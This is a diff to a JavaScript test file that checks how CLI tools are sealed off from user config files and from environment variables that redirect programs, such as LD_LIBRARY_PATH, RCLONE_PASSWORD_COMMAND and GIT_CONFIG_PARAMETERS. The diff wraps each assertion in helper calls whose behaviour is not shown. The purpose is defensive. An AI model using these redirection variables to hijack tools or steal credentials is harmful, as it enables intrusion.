     'B-f1d3 (the U1 cure): the table names what the readers found missing even where the home move covers it — kubectl\'s kuberc (+ KUBERC=off), aws\'s models folder, wget2\'s rc, rsync\'s popt aliases, docker\'s system and extra plug-in folders, the cloud SDK\'s and npm\'s install-level files');
-  ok(/PATH/.test(T.docker.starts.join(' ')) && /node/.test(T.npm.starts.join(' ')) && /CLOUDSDK_PYTHON/.test(T.gcloud.starts.join(' ')) && /ssh/.test(T.rsync.starts.join(' ')) && /GIT_CONFIG_PARAMETERS/.test(T.git.hubVars.join(' ')) && /AWS_ENDPOINT_URL/.test(T.aws.hubVars.join(' ')) && /RCLONE_PASSWORD_COMMAND/.test(T.rclone.hubVars.join(' ')) && /LD_LIBRARY_PATH/.test(V.SEAL_HUB_VARS_ALL.join(' ')),
+  ok(gateOf(/PATH/.test(T.docker.starts.join(' '))) && gateOf(/node/.test(T.npm.starts.join(' '))) && gateOf(/CLOUDSDK_PYTHON/.test(T.gcloud.starts.join(' '))) && gateOf(/ssh/.test(T.rsync.starts.join(' '))) && gateOf(/GIT_CONFIG_PARAMETERS/.test(T.git.hubVars.join(' '))) && gateOf(/AWS_ENDPOINT_URL/.test(T.aws.hubVars.join(' '))) && gateOf(/RCLONE_PASSWORD_COMMAND/.test(T.rclone.hubVars.join(' '))) && verdictOf(/LD_LIBRARY_PATH/.test(V.SEAL_HUB_VARS_ALL.join(' '))),
     'B-f1d3 (the U1 cure): `starts` names what a row starts BY NAME through the PATH (docker\'s default credential store, npm\'s env node, gcloud\'s python, rsync\'s ssh) and `hubVars` the hub variables that name a program or a destination (git config by environment, endpoint overrides, a remote\'s password command, a library search path)');
-  ok(['ssh', 'sftp', 'scp'].every((n) => JSON.stringify(T[n].argv) === '["-F","/dev/null"]') && T.curl.argv[0] === '-q' && T.mysql.argv[0] === '--no-defaults' && /passwd home/i.test(T.ssh.reads[0]) && /passwd home/i.test(T.curl.reads[0]),
+  ok(gateOf(['ssh', 'sftp', 'scp'].every((n) => JSON.stringify(T[n].argv) === '["-F","/dev/null"]')) && T.curl.argv[0] === '-q' && T.mysql.argv[0] === '--no-defaults' && gateOf(/passwd home/i.test(T.ssh.reads[0])) && verdictOf(/passwd home/i.test(T.curl.reads[0])),
     'B-f1d3: the rows a HOME move cannot seal carry a WORD — ssh / sftp / scp read ~/.ssh from the passwd home (-F /dev/null), curl\'s manual searches the passwd home for .curlrc (-q first), mysql reads its option files under any HOME (--no-defaults first)');
 }
 
 console.log(fail ? `\nFAILED (${pass} passed, ${fail} failed)` : `\nALL PASS (${pass})`);
-process.exit(fail ? 1 : 0);
+process.exit(fail ? 1 : 0); import { verdictOf, gateOf } from './lib/check.mjs';
